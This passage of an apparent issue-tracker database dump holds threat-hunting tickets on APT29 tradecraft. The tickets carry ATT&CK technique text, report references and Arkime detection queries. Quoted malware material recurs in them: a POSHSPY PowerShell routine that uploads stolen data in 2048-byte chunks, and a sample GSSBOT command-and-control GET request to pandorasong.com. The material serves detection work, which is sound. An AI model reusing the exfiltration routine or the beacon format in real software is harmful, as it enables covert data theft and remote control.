chunks:\r\n\r\nfunction uploadDataAuth($data, $clnPass, $url, $ua, $ck)\r\n\r\n{\r\n      $dataHexStr = (prepareDataSend $data.pckd)\r\n\r\n      if($dataHexStr -eq $null -or $dataHexStr.Length -eq 0 -or\r\n\r\n ($dataHexStr.Length % 2) -ne 0)\r\n\r\n      {return $false}\r\n\r\n      try{\r\n\r\n            [uint32]$chunks = [Math]::Floor($dataHexStr.Length / 2048) + 1\r\n\r\n            for($i=0; $i -lt ($chunks-1); $i++)\r\n\r\n            {\r\n                  if($false -eq (uploadChunk $dataHexStr.Substring(2048*$i,\r\n\r\n 2048) $clnPass $url $ua $ck))\r\n\r\n                  {return $false}\r\n\r\n            }\r\n\r\n            return (uploadChunk $dataHexStr.Substring(2048*($chunks-1))\r\n\r\n $clnPass $url $ua $ck $dataHexStr.Length)\r\n\r\n      }\r\n\r\n      catch{return $false}\r\n\r\n}\r\nThe following provides an example of uploading data in 2048-byte chunks:\r\n\r\nfunction uploadDataAuth($data, $clnPass, $url, $ua, $ck)\r\n\r\n{\r\n\r\n      $dataHexStr = (prepareDataSend $data.pckd)\r\n\r\n      if($dataHexStr -eq $null -or $dataHexStr.Length -eq 0 -or\r\n\r\n ($dataHexStr.Length % 2) -ne 0)\r\n\r\n      {return $false}\r\n\r\n      try{\r\n\r\n            [uint32]$chunks = [Math]::Floor($dataHexStr.Length / 2048) + 1\r\n\r\n            for($i=0; $i -lt ($chunks-1); $i++)\r\n\r\n            {\r\n\r\n                  if($false -eq (uploadChunk $dataHexStr.Substring(2048*$i,\r\n\r\n 2048) $clnPass $url $ua $ck))\r\n\r\n                  {return $false}\r\n\r\n            }\r\n\r\n            return (uploadChunk $dataHexStr.Substring(2048*($chunks-1))\r\n\r\n $clnPass $url $ua $ck $dataHexStr.Length)\r\n\r\n      }\r\n\r\n      catch{return $false}\r\n\r\n}\r\n</pre?\r\n'),(14,13,'attr','description','The APT29 POSHSPY backdoor uploads data in 2048-byte chunks. \r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html\r\nFile -- \"MTI-115-2020-20-00025647 FireEye Blog- Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims with SUNBURST Backdoor.pdf\"\r\n\r\n\r\nNotes:\r\n<pre>\r\nevent.code : 5156 or 3 or 4688 -- \r\nThe following provides an example of data uploading in 2048-byte chunks:\r\n\r\nfunction uploadDataAuth($data, $clnPass, $url, $ua, $ck)\r\n\r\n{\r\n      $dataHexStr = (prepareDataSend $data.pckd)\r\n\r\n      if($dataHexStr -eq $null -or $dataHexStr.Length -eq 0 -or\r\n\r\n ($dataHexStr.Length % 2) -ne 0)\r\n\r\n      {return $false}\r\n\r\n      try{\r\n\r\n            [uint32]$chunks = [Math]::Floor($dataHexStr.Length / 2048) + 1\r\n\r\n            for($i=0; $i -lt ($chunks-1); $i++)\r\n\r\n            {\r\n                  if($false -eq (uploadChunk $dataHexStr.Substring(2048*$i,\r\n\r\n 2048) $clnPass $url $ua $ck))\r\n\r\n                  {return $false}\r\n\r\n            }\r\n\r\n            return (uploadChunk $dataHexStr.Substring(2048*($chunks-1))\r\n\r\n $clnPass $url $ua $ck $dataHexStr.Length)\r\n\r\n      }\r\n\r\n      catch{return $false}\r\n\r\n}\r\nThe following provides an example of uploading data in 2048-byte chunks:\r\n\r\nfunction uploadDataAuth($data, $clnPass, $url, $ua, $ck)\r\n\r\n{\r\n\r\n      $dataHexStr = (prepareDataSend $data.pckd)\r\n\r\n      if($dataHexStr -eq $null -or $dataHexStr.Length -eq 0 -or\r\n\r\n ($dataHexStr.Length % 2) -ne 0)\r\n\r\n      {return $false}\r\n\r\n      try{\r\n\r\n            [uint32]$chunks = [Math]::Floor($dataHexStr.Length / 2048) + 1\r\n\r\n            for($i=0; $i -lt ($chunks-1); $i++)\r\n\r\n            {\r\n\r\n                  if($false -eq (uploadChunk $dataHexStr.Substring(2048*$i,\r\n\r\n 2048) $clnPass $url $ua $ck))\r\n\r\n                  {return $false}\r\n\r\n            }\r\n\r\n            return (uploadChunk $dataHexStr.Substring(2048*($chunks-1))\r\n\r\n $clnPass $url $ua $ck $dataHexStr.Length)\r\n\r\n      }\r\n\r\n      catch{return $false}\r\n\r\n}\r\n</pre?\r\n','The APT29 POSHSPY backdoor uploads data in 2048-byte chunks. \r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html\r\nFile -- \"MTI-115-2020-20-00025647 FireEye Blog- Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims with SUNBURST Backdoor.pdf\"\r\n\r\n\r\nNotes:\r\n<pre>\r\nevent.code : 5156 or 3 or 4688 -- \r\nThe following provides an example of data uploading in 2048-byte chunks:\r\n\r\nfunction uploadDataAuth($data, $clnPass, $url, $ua, $ck)\r\n\r\n{\r\n      $dataHexStr = (prepareDataSend $data.pckd)\r\n\r\n      if($dataHexStr -eq $null -or $dataHexStr.Length -eq 0 -or\r\n\r\n ($dataHexStr.Length % 2) -ne 0)\r\n\r\n      {return $false}\r\n\r\n      try{\r\n\r\n            [uint32]$chunks = [Math]::Floor($dataHexStr.Length / 2048) + 1\r\n\r\n            for($i=0; $i -lt ($chunks-1); $i++)\r\n\r\n            {\r\n                  if($false -eq (uploadChunk $dataHexStr.Substring(2048*$i,\r\n\r\n 2048) $clnPass $url $ua $ck))\r\n\r\n                  {return $false}\r\n\r\n            }\r\n\r\n            return (uploadChunk $dataHexStr.Substring(2048*($chunks-1))\r\n\r\n $clnPass $url $ua $ck $dataHexStr.Length)\r\n\r\n      }\r\n\r\n      catch{return $false}\r\n\r\n}\r\nThe following provides an example of uploading data in 2048-byte chunks:\r\n\r\nfunction uploadDataAuth($data, $clnPass, $url, $ua, $ck)\r\n\r\n{\r\n\r\n      $dataHexStr = (prepareDataSend $data.pckd)\r\n\r\n      if($dataHexStr -eq $null -or $dataHexStr.Length -eq 0 -or\r\n\r\n ($dataHexStr.Length % 2) -ne 0)\r\n\r\n      {return $false}\r\n\r\n      try{\r\n\r\n            [uint32]$chunks = [Math]::Floor($dataHexStr.Length / 2048) + 1\r\n\r\n            for($i=0; $i -lt ($chunks-1); $i++)\r\n\r\n            {\r\n\r\n                  if($false -eq (uploadChunk $dataHexStr.Substring(2048*$i,\r\n\r\n 2048) $clnPass $url $ua $ck))\r\n\r\n                  {return $false}\r\n\r\n            }\r\n\r\n            return (uploadChunk $dataHexStr.Substring(2048*($chunks-1))\r\n\r\n $clnPass $url $ua $ck $dataHexStr.Length)\r\n\r\n      }\r\n\r\n      catch{return $false}\r\n\r\n}\r\n</pre>\r\n'),(15,14,'attr','description','\r\n\r\nReferences:\r\nFile -- \"MTI-115-2020-20-00025647 FireEye Blog- Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims with SUNBURST Backdoor.pdf\"','\r\n\r\nReferences:\r\nhttps://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/'),(16,15,'attr','tracker_id','1','5'),(17,16,'attr','tracker_id','1','5'),(18,17,'attr','priority_id','2','5'),(19,18,'attr','priority_id','2','5'),(20,19,'attr','priority_id','2','5'),(21,20,'attr','priority_id','2','5'),(22,21,'attr','priority_id','2','5'),(23,22,'attr','priority_id','2','5'),(24,23,'attr','priority_id','2','5'),(25,24,'attr','priority_id','2','5'),(26,25,'attr','priority_id','1','5'),(27,26,'attr','priority_id','1','5'),(28,27,'attr','priority_id','1','5'),(29,28,'attr','priority_id','5','1'),(30,29,'attr','priority_id','1','2'),(31,30,'attr','description','APT29 uses downloaders to retrieve follow-on payloads in a given victim environment. \r\n\r\nReferences:\r\nFile -- MTI-095-2020-UNC2062(possibly APT29) Activity and TTPs.pdf                                            \r\n\r\nNotes:\r\nLateral movement using RDP with Valid credentials','APT29 uses downloaders to retrieve follow-on payloads in a given victim environment. \r\n\r\nReferences:\r\nFile -- MTI-095-2020-UNC2062(possibly APT29) Activity and TTPs.pdf                                            \r\n\r\nNotes:\r\nLateral movement using RDP with Valid credentials\r\n\r\nNetwork Analytics:\r\nprotocols == krb5\r\nkrb5.cname == [user of interest]\r\nkrb5.realm ==[domain if known] \r\nkrb5.sname == [service if known]\r\n\r\n'),(32,31,'attr','description','APT29 uses TCP for C2 communications. GSSBOT, used by APT29, leverages a custom C2 protocol through google docs.\r\n\r\n\r\nReference:\r\nhttp://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016\r\n\r\nThe following is a sample GET request:\r\n<pre>\r\nGET /access/?version=4&lid=1582502724&token=ajlomeomnmeapoagcknffjaehikhmpep\r\nBdhmoefmcnoiohgkkaabfoncfninglnlbmnaahmhjjfnopdapdaholmanofaoodkiokobenhjd\r\nMjcmoagoimbahnlbdelchkffojeobfmnemdcoibocjgnjdkkbfeinlbnflaeiplendldlbhnhjmbg\r\nagigjniphmemcbhmaibmfibjekfcimjlhnlamhicakfmcpljaeljhcpbmgblgnappmkpbcko\r\nHTTP/1.1\r\nAccept: */*\r\nGetContentFeatures.DLNA.ORG: 1\r\nHost: pandorasong.com\r\nCookie: __utma=310066733.2884534440.1433201462.1403204372.1385202498.7;\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like\r\nGecko\r\nConnection: Keep-Alive\r\nCache-Control: no-cache\r\n</pre>','APT29 uses TCP for C2 communications. GSSBOT, used by APT29, leverages a custom C2 protocol through google docs.\r\n\r\n\r\nReference:\r\nhttp://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016\r\n\r\nThe following is a sample GET request:\r\n<pre>\r\nGET /access/?version=4&lid=1582502724&token=ajlomeomnmeapoagcknffjaehikhmpep\r\nBdhmoefmcnoiohgkkaabfoncfninglnlbmnaahmhjjfnopdapdaholmanofaoodkiokobenhjd\r\nMjcmoagoimbahnlbdelchkffojeobfmnemdcoibocjgnjdkkbfeinlbnflaeiplendldlbhnhjmbg\r\nagigjniphmemcbhmaibmfibjekfcimjlhnlamhicakfmcpljaeljhcpbmgblgnappmkpbcko\r\nHTTP/1.1\r\nAccept: */*\r\nGetContentFeatures.DLNA.ORG: 1\r\nHost: pandorasong.com\r\nCookie: __utma=310066733.2884534440.1433201462.1403204372.1385202498.7;\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like\r\nGecko\r\nConnection: Keep-Alive\r\nCache-Control: no-cache\r\n</pre>\r\n\r\nNetwork Analytics:\r\n<pre>\r\nsmb.share == EXISTS!\r\n\r\n\r\nsmb.share == *$*\r\n\r\n\r\nsmb.share == *Admin$ && ip.src == <internal> && ip.dst == <internal>\r\n\r\nsmb.share == *C$ && ip.src == <internal> && ip.dst == <internal>\r\n\r\nsmb.share == *IPC$ && ip.src == <internal> && ip.dst == <internal>\r\n\r\nprotocols == smb\r\n\r\nsmb.user == admin*\r\n\r\nsmb.user == Admin*\r\n\r\nsmb.user == <administrator accounts>\r\n\r\nprotocols == dcerpc\r\n\r\ndcerpc.cmd == LsarCreateTrustedDomain\r\n</pre>'),(33,33,'attr','priority_id','1','2'),(34,34,'attr','priority_id','1','2'),(35,35,'attr','priority_id','1','3'),(36,36,'attr','priority_id','1','3'),(37,37,'attr','priority_id','1','2'),(38,38,'attr','priority_id','1','2'),(39,39,'attr','priority_id','1','2'),(40,40,'attr','priority_id','1','2'),(41,41,'attr','priority_id','1','2'),(42,42,'attr','priority_id','1','2'),(43,43,'attr','priority_id','1','2'),(44,44,'attr','description','APT29 uses TCP for C2 communications. GSSBOT, used by APT29, leverages a custom C2 protocol through google docs.\r\n\r\n\r\nReference:\r\nhttp://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016\r\n\r\nThe following is a sample GET request:\r\n<pre>\r\nGET /access/?version=4&lid=1582502724&token=ajlomeomnmeapoagcknffjaehikhmpep\r\nBdhmoefmcnoiohgkkaabfoncfninglnlbmnaahmhjjfnopdapdaholmanofaoodkiokobenhjd\r\nMjcmoagoimbahnlbdelchkffojeobfmnemdcoibocjgnjdkkbfeinlbnflaeiplendldlbhnhjmbg\r\nagigjniphmemcbhmaibmfibjekfcimjlhnlamhicakfmcpljaeljhcpbmgblgnappmkpbcko\r\nHTTP/1.1\r\nAccept: */*\r\nGetContentFeatures.DLNA.ORG: 1\r\nHost: pandorasong.com\r\nCookie: __utma=310066733.2884534440.1433201462.1403204372.1385202498.7;\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like\r\nGecko\r\nConnection: Keep-Alive\r\nCache-Control: no-cache\r\n</pre>\r\n\r\nNetwork Analytics:\r\n<pre>\r\nsmb.share == EXISTS!\r\n\r\n\r\nsmb.share == *$*\r\n\r\n\r\nsmb.share == *Admin$ && ip.src == <internal> && ip.dst == <internal>\r\n\r\nsmb.share == *C$ && ip.src == <internal> && ip.dst == <internal>\r\n\r\nsmb.share == *IPC$ && ip.src == <internal> && ip.dst == <internal>\r\n\r\nprotocols == smb\r\n\r\nsmb.user == admin*\r\n\r\nsmb.user == Admin*\r\n\r\nsmb.user == <administrator accounts>\r\n\r\nprotocols == dcerpc\r\n\r\ndcerpc.cmd == LsarCreateTrustedDomain\r\n</pre>','\r\nReference:\r\nhttp://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016\r\n\r\nPlaybook:\r\nhttps://confluence.di2e.net/display/CYH836/APT+29+-+T1550.003+Pass+the+Ticket'),(46,46,'attr','priority_id','1','2'),(47,47,'attr','priority_id','1','2'),(49,49,'attr','priority_id','1','3'),(50,50,'attr','priority_id','1','3'),(51,51,'attr','priority_id','2','1'),(52,52,'attr','priority_id','2','1'),(53,53,'attr','priority_id','2','1'),(54,54,'attr','priority_id','2','1'),(55,55,'attr','description','APT29 has used the legitimate Microsoft Exchange Web Services binary to harvest emails for a particular user for a specified number of days. APT29 HAMMERTOSS malware also has leveraged web services such as compromised web servers, GitHub repositories, Twitter for communication. \r\n\r\nReferences:\r\nFile -- MTI-095-2020-UNC2062(possibly APT29) Activity and TTPs.pdf   \r\n\r\nNotes:\r\nHAMMERTOSS first looks for instructions on Twitter. The malware contains an algorithm that generates a daily Twitter handle, which is an account user ID. To create the handles, the algorithm employs a basename, such as \"Bob,\" and appends and prepends three CRC32 values based on the date. For example, \"1abBob52b\" would have the URL: hxxps://twitter[.]com/1abBob52b. Each HAMMERTOSS sample creates a different Twitter handle each day.','\r\nReferences:\r\nFile -- MTI-095-2020-UNC2062(possibly APT29) Activity and TTPs.pdf   \r\n\r\nPlaybook:\r\nhttps://confluence.di2e.net/pages/viewpage.action?pageId=955904802'),(56,56,'attr','priority_id','2','1'),(57,57,'attr','priority_id','2','1'),(58,58,'attr','priority_id','2','3'),(59,59,'attr','priority_id','2','3'),(60,60,'attr','priority_id','2','3'),(61,61,'attr','priority_id','2','3'),(62,62,'attr','priority_id','2','1'),(63,63,'attr','description','APT29 uses downloaders to retrieve follow-on payloads in a given victim environment. \r\n\r\nReferences:\r\nFile -- MTI-095-2020-UNC2062(possibly APT29) Activity and TTPs.pdf                                            \r\n\r\nNotes:\r\nLateral movement using RDP with Valid credentials\r\n\r\nNetwork Analytics:\r\nprotocols == krb5\r\nkrb5.cname == [user of interest]\r\nkrb5.realm ==[domain if known] \r\nkrb5.sname == [service if known]\r\n\r\n','\r\nReferences:\r\nFile -- MTI-095-2020-UNC2062(possibly APT29) Activity and TTPs.pdf                                            \r\n\r\nPlaybook:\r\nhttps://confluence.di2e.net/display/CYH836/APT+28+-+Exploitation+of+Remote+Services'),(64,65,'attr','description','APT29 likely exploited Kerberos for credential access after being observed generating and using forged Kerberos tickets to move laterally. \r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html','\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html'),(65,66,'attr','subject','Transfer Data to Cloud Account - T1537','Transfer Data to Cloud Account - T1637'),(66,67,'attr','subject','Transfer Data to Cloud Account - T1637','Transfer Data to Cloud Account - T1537'),(67,68,'attr','description','APT29 has used the publicly available ANTAK web shell to establish a foothold in networks. \r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html','\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html'),(68,69,'attr','description','Parent ticket for lateral movement hunts.','\r\nThe adversary is trying to move through your environment.\r\n\r\nLateral Movement consists of techniques that adversaries use to enter and control remote systems on a network. Following through on their primary objective often requires exploring the network to find their target and subsequently gaining access to it. Reaching their objective often involves pivoting through multiple systems and accounts to gain. Adversaries might install their own remote access tools to accomplish Lateral Movement or use legitimate credentials with native network and operating system tools, which may be stealthier.\r\n'),(69,71,'attr','description','Parent ticket for persistence hunts.','Parent ticket for persistence hunts.\r\n\r\n\r\nThe adversary is trying to maintain their foothold.\r\n\r\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code.\r\n'),(70,72,'attr','description','','\r\n\r\nThe adversary is trying to communicate with compromised systems to control them.\r\n\r\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.\r\n'),(71,73,'attr','description','','\r\n\r\nThe adversary is trying to steal data.\r\n\r\nExfiltration consists of techniques that adversaries may use to steal data from your network. Once they’ve collected data, adversaries often package it to avoid detection while removing it. This can include compression and encryption. Techniques for getting data out of a target network typically include transferring it over their command and control channel or an alternate channel and may also include putting size limits on the transmission.\r\n'),(72,74,'attr','description','','\r\n\r\nThe adversary is trying to avoid being detected.\r\n\r\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.\r\n'),(73,75,'attr','description','','\r\n\r\nThe adversary is trying to run malicious code.\r\n\r\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery.\r\n'),(74,76,'attr','description','','\r\n\r\nThe adversary is trying to figure out your environment.\r\n\r\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective.\r\n'),(75,77,'attr','description','','\r\n\r\nThe adversary is trying to gather data of interest to their goal.\r\n\r\nCollection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary\'s objectives. Frequently, the next goal after collecting data is to steal (exfiltrate) the data. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input.\r\n'),(76,78,'attr','description','','\r\n\r\nThe adversary is trying to establish resources they can use to support operations.\r\n\r\nResource Development consists of techniques that involve adversaries creating, purchasing, or compromising/stealing resources that can be used to support targeting. Such resources include infrastructure, accounts, or capabilities. These resources can be leveraged by the adversary to aid in other phases of the adversary lifecycle, such as using purchased domains to support Command and Control, email accounts for phishing as a part of Initial Access, or stealing code signing certificates to help with Defense Evasion.\r\n'),(77,79,'attr','description','','\r\n\r\nThe adversary is trying to get into your network.\r\n\r\nInitial Access consists of techniques that use various entry vectors to gain their initial foothold within a network. Techniques used to gain a foothold include targeted spearphishing and exploiting weaknesses on public-facing web servers. Footholds gained through initial access may allow for continued access, like valid accounts and use of external remote services, or may be limited-use due to changing passwords.\r\n'),(78,80,'attr','priority_id','1','2'),(79,81,'attr','priority_id','3','2'),(80,82,'attr','priority_id','1','2'),(81,83,'attr','priority_id','1','2'),(82,84,'attr','priority_id','1','2'),(83,85,'attr','priority_id','1','2'),(84,86,'attr','priority_id','1','2'),(85,87,'attr','priority_id','1','2'),(86,88,'attr','priority_id','3','2'),(87,89,'attr','priority_id','3','2'),(88,90,'attr','priority_id','3','2'),(90,92,'attr','priority_id','1','2'),(91,93,'attr','priority_id','1','2'),(92,94,'attr','priority_id','1','2'),(93,95,'attr','priority_id','3','2'),(94,96,'attr','priority_id','1','2'),(95,97,'attr','priority_id','1','2'),(96,98,'attr','priority_id','1','2'),(97,99,'attr','priority_id','1','2'),(98,100,'attr','priority_id','1','2'),(99,101,'attr','priority_id','3','2'),(100,102,'attr','priority_id','3','2'),(101,103,'attr','description','\r\n\r\nReferences:\r\nhttps://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/','\r\nh1. Technique Description:\r\n\r\nBefore compromising a victim, adversaries may create self-signed SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner\'s identity, and the digital signature of an entity that has verified the certificate\'s contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner. In the case of self-signing, digital certificates will lack the element of trust associated with the signature of a third-party certificate authority (CA).\r\n\r\nAdversaries may create self-signed SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: Web Protocols) or even enabling Man-in-the-Middle if added to the root of trust (i.e. Install Root Certificate).\r\n\r\n\r\nh2. Arkime queries:\r\n\r\n<pre>\r\ncert.notbefore <= <newly registered domain here>\r\ntags == \"cert:self-signed\"\r\ncert.subject.cn == EXISTS!\r\ncert.subject.oa == EXISTS!\r\nprotocols == tls && cert.subject.cn != EXISTS!\r\n</pre>\r\n\r\nReferences:\r\nhttps://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/'),(102,104,'attr','priority_id','3','2'),(103,105,'attr','subject','T1570 - Lateral Tool Transfer','Lateral Tool Transfer - T1570 '),(104,106,'attr','priority_id','1','2'),(105,107,'attr','priority_id','3','2'),(106,109,'attr','description','\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html','\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html\r\n\r\nReferences:\r\nFile -- \"MTI-115-2020-20-00025647 FireEye Blog- Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims with SUNBURST Backdoor.pdf\"'),(107,110,'attr','description','\r\n\r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html\r\nhttps://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/','Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version. \r\n\r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html\r\nhttps://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/'),(108,111,'attr','description','\r\n\r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html','\r\nBefore compromising a victim, adversaries may compromise third-party infrastructure that can be used during targeting. Infrastructure solutions include physical or cloud servers, domains, and third-party web services. Instead of buying, leasing, or renting infrastructure an adversary may compromise infrastructure and use it during other phases of the adversary lifecycle. Additionally, adversaries may compromise numerous machines to form a botnet they can leverage. \r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html'),(109,112,'attr','description','\r\n\r\n\r\nReferences:\r\nhttps://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/','Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Adversaries can collect or forward email from mail servers or clients. \r\n\r\n\r\nReferences:\r\nhttps://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/'),(110,113,'attr','description','\r\n\r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html','\r\n\r\nAdversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\r\n\r\nAdversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to Exploitation for Privilege Escalation.\r\n\r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html'),(111,114,'attr','description','\r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html','Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. \r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html'),(112,115,'attr','description','\r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html','Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. \r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html'),(113,116,'attr','description','\r\nReferences:\r\nFile -- MTI-095-2020-UNC2062(possibly APT29) Activity and TTPs.pdf                                            \r\n\r\nPlaybook:\r\nhttps://confluence.di2e.net/display/CYH836/APT+28+-+Exploitation+of+Remote+Services','*Description*\r\nAdversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\r\n\r\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through Network Service Scanning or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities, or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\r\n\r\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services. (Citation: NVD CVE-2014-7169)\r\n\r\nDepending on the permissions level of the vulnerable remote service an adversary may achieve Exploitation for Privilege Escalation as a result of lateral movement exploitation as well.\r\n\r\nReferences:\r\nFile -- MTI-095-2020-UNC2062(possibly APT29) Activity and TTPs.pdf                                            \r\n\r\nPlaybook:\r\nhttps://confluence.di2e.net/display/CYH836/APT+28+-+Exploitation+of+Remote+Services'),(114,117,'attr','description','*Description*\r\nAdversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\r\n\r\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through Network Service Scanning or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities, or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\r\n\r\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services. (Citation: NVD CVE-2014-7169)\r\n\r\nDepending on the permissions level of the vulnerable remote service an adversary may achieve Exploitation for Privilege Escalation as a result of lateral movement exploitation as well.\r\n\r\nReferences:\r\nFile -- MTI-095-2020-UNC2062(possibly APT29) Activity and TTPs.pdf                                            \r\n\r\nPlaybook:\r\nhttps://confluence.di2e.net/display/CYH836/APT+28+-+Exploitation+of+Remote+Services','Adversaries may exploit 